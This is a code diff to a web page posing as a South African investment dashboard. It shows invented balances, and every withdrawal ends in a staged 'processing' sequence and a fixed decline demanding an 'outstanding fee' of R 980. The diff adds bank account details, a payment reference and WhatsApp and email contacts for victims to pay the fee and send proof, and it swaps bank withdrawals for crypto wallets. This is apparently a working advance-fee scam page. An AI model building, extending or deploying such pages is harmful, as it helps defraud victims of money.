@@ -76,6 +76,16 @@ body{font-family:'Segoe UI',Arial,sans-serif;line-height:1.6;color:#333;}
 .decl > p{font-size:13px;color:#555;margin-bottom:12px;}
 .decl-reason{background:#fffbeb;border:1px solid #f59e0b;border-radius:8px;padding:14px;font-size:13px;color:#78350f;text-align:left;margin-bottom:12px;line-height:1.8;}
 .decl-reason i{color:#f59e0b;margin-right:6px;}
+.bank-box{background:#f0f4ff;border:1px solid #93c5fd;border-radius:8px;padding:16px;text-align:left;font-size:13px;margin-bottom:12px;}
+.bank-box h5{font-size:13px;font-weight:700;color:#1a1a2e;margin-bottom:10px;display:flex;align-items:center;gap:6px;}
+.bank-row{display:flex;justify-content:space-between;align-items:center;padding:5px 0;border-bottom:1px solid #dbeafe;}
+.bank-row:last-child{border-bottom:none;}
+.bank-row .lbl{color:#666;font-size:12px;}
+.bank-row .val{font-weight:700;color:#1a1a2e;font-size:13px;}
+.ref-box{background:#fef3c7;border:1px solid #fcd34d;border-radius:8px;padding:12px 16px;text-align:left;font-size:13px;margin-bottom:12px;display:flex;align-items:center;gap:10px;}
+.ref-box i{color:#f59e0b;font-size:18px;}
+.ref-box .ref-lbl{color:#666;font-size:12px;display:block;}
+.ref-box .ref-val{font-weight:800;color:#92400e;font-size:15px;letter-spacing:1px;}
 .abox{display:flex;align-items:flex-start;gap:12px;background:#f0fdf4;border:1px solid #86efac;border-radius:8px;padding:14px;text-align:left;font-size:13px;margin-bottom:16px;}
 .abox .fab{font-size:28px;color:#25d366;margin-top:2px;}
 .abox a{color:#1d4ed8;text-decoration:none;}
@@ -160,7 +170,7 @@ body{font-family:'Segoe UI',Arial,sans-serif;line-height:1.6;color:#333;}
       <div class="dpanel">
         <div class="dpanel-title"><i class="fa fa-money-bill-wave"></i> Withdraw Funds</div>
         <div id="wStep1">
-          <div class="wnote">Minimum withdrawal: <strong id="wMin">R 500.00</strong></div>
+          <div class="wnote"><i class="fa fa-check-circle" style="color:#16a34a;"></i> No minimum withdrawal &mdash; withdraw any amount.</div>
           <div class="wfield">
             <label>Withdrawal Code</label>
             <input type="text" id="wCode" placeholder="Enter your withdrawal code">
@@ -168,42 +178,82 @@ body{font-family:'Segoe UI',Arial,sans-serif;line-height:1.6;color:#333;}
           </div>
           <div class="wfield">
             <label>Amount (ZAR)</label>
-            <input type="number" id="wAmt" placeholder="Enter amount">
+            <input type="number" id="wAmt" placeholder="Enter any amount">
           </div>
           <div class="wfield">
-            <label>Bank Account Number</label>
-            <input type="text" id="wBank" placeholder="Destination account number">
+            <label>Crypto Wallet Address</label>
+            <input type="text" id="wWallet" placeholder="Enter your crypto wallet address" maxlength="500" autocomplete="off" spellcheck="false">
+            <small>Supports Bitcoin, Ethereum, USDT and all major wallet formats.</small>
           </div>
           <button class="wbtn" onclick="startWithdraw()"><i class="fa fa-paper-plane"></i> Submit Withdrawal Request</button>
           <div class="werr" id="werr"></div>
         </div>
+
         <div id="wProc" style="display:none;" class="proc">
           <div class="proc-icon"><i class="fa fa-spinner fa-spin"></i></div>
           <div class="proc-txt">Processing your withdrawal...</div>
           <div class="prog-wrap"><div class="prog-bar" id="progBar"></div></div>
           <div class="proc-sub" id="procStat">Connecting to secure gateway...</div>
         </div>
+
         <div id="wDecl" style="display:none;" class="decl">
           <div class="decl-icon"><i class="fa fa-times-circle"></i></div>
           <h4>Withdrawal Declined</h4>
           <p>Your withdrawal request could not be processed.</p>
+
           <div class="decl-reason">
             <i class="fa fa-exclamation-triangle"></i>
             <strong>Outstanding Fee Detected</strong><br>
-            There is an outstanding account fee of <strong>R 980.00</strong> that must be paid before any withdrawal can be processed. Please contact your agent to resolve this.
+            There is an outstanding account fee of <strong>R 980.00</strong> that must be paid before any withdrawal can be processed.
           </div>
+
+          <div class="bank-box">
+            <h5><i class="fa fa-university"></i> Pay Your Fee &mdash; Banking Details</h5>
+            <div class="bank-row">
+              <span class="lbl">Bank</span>
+              <span class="val">ABSA</span>
+            </div>
+            <div class="bank-row">
+              <span class="lbl">Account Number</span>
+              <span class="val">4113514633</span>
+            </div>
+            <div class="bank-row">
+              <span class="lbl">Account Type</span>
+              <span class="val">Current</span>
+            </div>
+            <div class="bank-row">
+              <span class="lbl">Branch Code</span>
+              <span class="val">632005</span>
+            </div>
+            <div class="bank-row">
+              <span class="lbl">Amount</span>
+              <span class="val" style="color:#dc2626;">R 980.00</span>
+            </div>
+          </div>
+
+          <div class="ref-box">
+            <i class="fa fa-tag"></i>
+            <div>
+              <span class="ref-lbl">Use this payment reference</span>
+              <span class="ref-val">Arno#1800</span>
+            </div>
+          </div>
+
           <div class="abox">
             <i class="fab fa-whatsapp"></i>
             <div>
-              <strong>Contact Your Agent</strong><br>
-              <a href="https://wa.me/27836240290" target="_blank">WhatsApp: +27 83 624 0290</a><br>
-              <a href="mailto:jsecompany72@gmail.com">jsecompany72@gmail.com</a>
+              <strong>Contact Your Agent After Payment</strong><br>
+              <span style="font-size:12px;color:#555;">Send proof of payment to your agent to unlock your withdrawal.</span><br><br>
+              <strong>WhatsApp:</strong> <a href="https://wa.me/27836240290" target="_blank">+27 83 624 0290</a><br>
+              <strong>Email:</strong> jsecompany72&#64;gmail.com
             </div>
           </div>
+
           <button class="btn-retry" onclick="resetW()"><i class="fa fa-redo"></i> Try Again</button>
         </div>
       </div>
     </div>
+
     <div class="dpanel">
       <div class="dpanel-title"><i class="fa fa-history"></i> Recent Transactions</div>
       <table class="dtable">
@@ -223,7 +273,6 @@ var U = {
     portfolio: 2500000000,
     available: 2500000000,
     profit: 2500000000,
-    minW: 1200000000,
     h: [
       {f:"JSE Top 40 ETF", u:450, p:412.50, v:185625, r:"+18.2%"},
       {f:"Satrix MSCI World", u:320, p:298.75, v:95600, r:"+22.4%"},
@@ -245,7 +294,6 @@ var U = {
     portfolio: 212600,
     available: 28300,
     profit: 19870,
-    minW: 500,
     h: [
       {f:"Satrix Dividend Plus", u:700, p:168.50, v:117950, r:"+14.7%"},
       {f:"Allan Gray Equity", u:260, p:231.00, v:60060, r:"+11.2%"},
@@ -263,7 +311,6 @@ var U = {
     portfolio: 1024500,
     available: 145000,
     profit: 112400,
-    minW: 500,
     h: [
       {f:"JSE Top 40 ETF", u:2100, p:412.50, v:866250, r:"+18.2%"},
       {f:"Global Diversified Fund", u:450, p:352.00, v:158400, r:"+25.1%"}
@@ -326,8 +373,6 @@ function buildDash() {
   document.getElementById("dPort").textContent = fmt(AU.portfolio);
   document.getElementById("dAvail").textContent = fmt(AU.available);
   document.getElementById("dRet").textContent = fmt(AU.profit);
-  document.getElementById("wMin").textContent = fmt(AU.minW);
-  document.getElementById("wAmt").placeholder = "Minimum " + fmt(AU.minW);
   var hb = document.getElementById("hTbody");
   hb.innerHTML = "";
   for (var i = 0; i < AU.h.length; i++) {
@@ -346,12 +391,12 @@ function buildDash() {
 function startWithdraw() {
   var code = document.getElementById("wCode").value.trim();
   var amt = parseFloat(document.getElementById("wAmt").value);
-  var bank = document.getElementById("wBank").value.trim();
+  var wallet = document.getElementById("wWallet").value.trim();
   var errEl = document.getElementById("werr");
   errEl.style.display = "none";
   if (!code || code.length < 4) { errEl.textContent = "Please enter a valid withdrawal code."; errEl.style.display = "block"; return; }
-  if (!bank) { errEl.textContent = "Please enter a destination bank account number."; errEl.style.display = "block"; return; }
-  if (isNaN(amt) || amt < AU.minW) { errEl.textContent = "Minimum withdrawal amount is " + fmt(AU.minW) + "."; errEl.style.display = "block"; return; }
+  if (!wallet || wallet.length < 6) { errEl.textContent = "Please enter a valid crypto wallet address."; errEl.style.display = "block"; return; }
+  if (isNaN(amt) || amt <= 0) { errEl.textContent = "Please enter a valid amount."; errEl.style.display = "block"; return; }
   document.getElementById("wStep1").style.display = "none";
   document.getElementById("wProc").style.display = "block";
   var steps = ["Connecting to secure gateway...","Verifying account credentials...","Checking compliance status...","Contacting payment network...","Finalising request..."];
@@ -378,7 +423,7 @@ function resetW() {
   var sd = document.getElementById("wDecl"); if (sd) sd.style.display = "none";
   var wc = document.getElementById("wCode"); if (wc) wc.value = "";
   var wa = document.getElementById("wAmt"); if (wa) wa.value = "";
-  var wb = document.getElementById("wBank"); if (wb) wb.value = "";
+  var ww = document.getElementById("wWallet"); if (ww) ww.value = "";
   var pb = document.getElementById("progBar"); if (pb) pb.style.width = "0";
   var ps = document.getElementById("procStat"); if (ps) ps.textContent = "Connecting to secure gateway...";
   var we = document.getElementById("werr"); if (we) we.style.display = "none";
